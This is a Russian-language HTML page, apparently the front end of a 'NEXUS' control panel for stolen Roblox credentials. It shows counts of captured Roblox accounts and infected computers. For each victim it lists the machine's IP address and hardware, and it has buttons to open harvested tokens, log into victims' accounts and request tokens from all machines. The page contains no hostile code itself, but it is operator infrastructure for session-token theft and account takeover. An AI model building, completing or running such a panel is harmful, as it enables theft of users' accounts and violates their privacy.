<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>NEXUS - Приборная панель</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="assets/style.css?v=106">
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
</head>
<body>
  <div class="sidebar-layout">
    <div id="sidebarSlot"></div>
    <main class="main-content">
      <div class="top-bar">
        <h1 class="page-title">Управление файлами</h1>
      </div>
  <div class="stats-bar">
    <div class="stat-card"><div class="stat-label">Roblox Аккаунтов</div><div class="stat-value accent" id="sRoblox">—</div></div>
    <div class="stat-card"><div class="stat-label">Компьютеров</div><div class="stat-value" id="sPCs">—</div></div>
    <div class="stat-card"><div class="stat-label">Последняя отправка</div><div class="stat-value" id="sLast">—</div></div>
  </div>

    <!-- График статистики -->
    <div class="chart-card">
      <canvas id="statsChart"></canvas>
    </div>

  <div class="controls-panel">
    <div class="search-bar-wrapper">
      <input type="text" class="search-input" id="searchBar" placeholder="Поиск по имени файла..." oninput="filterFiles()">
      <select class="filter-select" id="sortFiles" onchange="filterFiles()">
        <option value="date">По дате (новые)</option>
        <option value="roblox">Сначала зеленые</option>
      </select>
    </div>
    <button class="btn-refresh" onclick="loadFiles()">↻ Обновить</button>
    <button class="btn-refresh" id="btnRequestAll" style="border-color:rgba(99,102,241,0.2); color:var(--accent);">📡 Запросить у всех</button>
  </div>

  <main class="files-grid" id="fileGrid">
    <div class="skeleton" style="height: 250px;"></div>
    <div class="skeleton" style="height: 250px;"></div>
    <div class="skeleton" style="height: 250px;"></div>
    <div class="skeleton" style="height: 250px;"></div>
  </main>
  
  </div> <!-- end of sidebar-layout -->

  <div id="fileModal" class="modal-overlay" onclick="closeModal()">
    <div class="modal-container" onclick="event.stopPropagation()">
      <button class="modal-close" onclick="closeModal()">✕</button>
      <div class="modal-content-wrapper">
      <div class="modal-content-wrapper" style="flex-direction: column; padding: 2rem; overflow-y: auto;">
        <h3 class="modal-filename" id="modalFilename" style="text-align: center; margin-bottom: 2rem; font-size: 1.5rem; letter-spacing: -0.5px;">Название файла</h3>
        
        <div style="display: flex; gap: 2rem; flex-wrap: wrap;">
          <div class="modal-details-pane">
            <div class="specs-section">
              <h4 class="section-title">Характеристики</h4>
              <div class="specs-grid">
                <div class="spec-row"><span class="spec-lbl">Компьютер</span><span class="spec-val" id="specName">—</span></div>
                <div class="spec-row"><span class="spec-lbl">Версия</span><span class="spec-val" id="specVersion">—</span></div>
                <div class="spec-row"><span class="spec-lbl">IP-адрес</span><span class="spec-val" id="specIp">—</span></div>
                <div class="spec-row"><span class="spec-lbl">ОС</span><span class="spec-val" id="specOs">—</span></div>
                <div class="spec-row"><span class="spec-lbl">CPU</span><span class="spec-val" id="specCpu">—</span></div>
                <div class="spec-row"><span class="spec-lbl">RAM</span><span class="spec-val" id="specRam">—</span></div>
                <div class="spec-row"><span class="spec-lbl">GPU</span><span class="spec-val" id="specGpu">—</span></div>
                <div class="spec-row"><span class="spec-lbl">Дата</span><span class="spec-val" id="specDate">—</span></div>
              </div>
            </div>
          </div>
          
          <div class="modal-roblox-pane">
          <div class="specs-section" id="robloxSpecsSection">
            <h4 class="section-title">Roblox аккаунт</h4>
            <div class="specs-grid">
              <div class="spec-row"><span class="spec-lbl">Никнейм</span><span class="spec-val" id="robloxSpecUser" style="color: var(--success); font-weight: 700;">—</span></div>
              <div class="spec-row" id="tokenStatusRow" style="display:none;"><span class="spec-lbl">Статус</span><span class="spec-val" id="tokenStatusText" style="color: var(--danger); font-weight: 600;">—</span></div>
              <div class="spec-row" id="tokenRequestRow"><span class="spec-lbl">Запрос токена</span><span class="spec-val" id="tokenRequestStatus">—</span></div>
            </div>
          </div>

          <div class="modal-actions">
            <button class="modal-btn" id="modalOpenBtn" style="background:rgba(16,185,129,0.15); color:var(--success); border:1px solid rgba(16,185,129,0.3);">📂 Открыть токены</button>
            <button class="modal-btn" id="modalLoginBtn" style="background:rgba(34,197,94,0.12); color:#22c55e; border:1px solid rgba(34,197,94,0.15);">👤 Войти в аккаунт</button>
            <button class="modal-btn" id="modalRequestBtn" style="background:rgba(99,102,241,0.15); color:var(--accent); border:1px solid rgba(99,102,241,0.3);">📡 Запросить токен</button>

            <button class="modal-btn del-btn" id="modalDeleteBtn">Удалить</button>
          </div>
        </div>
        </div> <!-- end flex container -->
      </div>
    </div>
  </div>

  <div id="toast"></div>

  <script src="assets/config.js?v=106"></script>
  <script src="assets/app.js?v=106"></script>
  <script src="assets/dashboard.js?v=106"></script>
</body>
</html>
